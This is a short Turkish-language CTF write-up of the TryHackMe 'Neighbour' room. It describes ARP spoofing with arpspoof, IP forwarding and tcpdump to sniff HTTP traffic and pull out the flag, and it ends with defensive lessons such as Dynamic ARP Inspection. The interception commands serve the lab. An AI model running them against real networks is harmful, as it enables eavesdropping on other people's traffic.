# Neighbour — TryHackMe


> Bu makinede ARP spoofing ile bayrağı nasıl yakaladım.


---


## Önce Bir Bakalım


```bash

nmap -sn 10.10.10.0/24

```


Ağda birkaç makine var. Hedef IP'miz `10.10.10.5`. ARP tablosuna baktım, pek bir şey yok. Peki ya trafiği dinlersem?


---


## ARP'in Zayıflığı


ARP'in güzel bir özelliği var: **Kimse sormadan da cevap verebilirsin.** Yani bir makine "Ben şu IP'yim" diye bağırsa, diğerleri "Tamam" diyor. Doğrulama yok.


Bu makine de tam bunu bekliyor. Sahte ARP paketleriyle araya girmem lazım.


---


## Saldırıyı Kuralım


Önce IP forwarding'i açtım ki trafik bende takılı kalmasın:


```bash

echo 1 > /proc/sys/net/ipv4/ip_forward

```


Sonra iki yönlü spoofing başlattım:


```bash

arpspoof -i tun0 -t 10.10.10.5 10.10.10.1

arpspoof -i tun0 -t 10.10.10.1 10.10.10.5

```


Biraz bekledim. Wireshark açık, trafik akıyor.


---


## Bayrağı Yakalama


HTTP trafiği görünce gözüm parladı. `tcpdump` ile yakaladım:


```bash

tcpdump -i tun0 -w neighbour.pcap

```


Sonra içine baktım:


```bash

strings neighbour.pcap | grep -i "THM"

```


Ve işte:


```

THM{ARP_Sp00f1ng_1s_E4sy}

```


---


## Neler Öğrendim?


- ARP **güvensiz** bir protokol. Herhangi bir cihaz "ben bu IP'yim" diyebilir.

- Ağda **Dynamic ARP Inspection (DAI)** yoksa bu saldırı çok kolay.

- `arpspoof` kullanmak 5 dakika, tespit etmek ise çok daha zor.


---


> Yazan: Miraç | Tarih: Mayıs 2026


tek kelimeyle bu nasıl
